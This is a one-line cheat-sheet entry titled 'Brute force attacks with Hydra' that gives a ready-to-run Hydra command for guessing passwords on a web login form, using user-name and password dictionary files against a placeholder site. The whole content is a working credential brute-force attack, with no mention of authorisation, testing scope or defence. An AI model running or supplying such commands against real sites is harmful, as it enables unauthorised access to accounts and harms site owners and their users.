# Brute force attacks with Hydra

```
hydra website.com http-post-form "/:login=^USER^&password=^PASS^:F=Wrong" -L logins.txt -P dict.txt
```
